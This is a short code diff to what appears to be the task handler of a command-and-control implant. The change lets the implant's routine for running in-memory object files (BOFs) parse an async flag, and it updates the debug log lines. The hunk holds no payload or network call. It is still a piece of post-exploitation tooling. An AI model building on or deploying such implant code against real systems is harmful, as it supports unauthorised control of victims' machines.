@@ -253,11 +253,13 @@ auto DECLFN Task::ExecBof(
     ULONG BofLen   = 0;
     PBYTE BofBuff  = Self->Psr->Bytes( Parser, &BofLen );
     ULONG BofCmdID = Self->Psr->Int32( Parser );
+    BOOL  BofAsync = Self->Psr->Int32( Parser );
     ULONG BofArgc  = 0;
     PBYTE BofArgs  = Self->Psr->Bytes( Parser, &BofArgc );
 
-    KhDbg("bof id  : %d", BofCmdID);
-    KhDbg("bof args: %p [%d bytes]", BofArgs, BofArgc);
+    KhDbg("bof id    : %d", BofCmdID);
+    KhDbg("bof async : %s", BofAsync ? "true" : "false");
+    KhDbg("bof args  : %p [%d bytes]", BofArgs, BofArgc);
 
     Self->Pkg->Int32( Self->Pkg->Shared, BofCmdID );
 
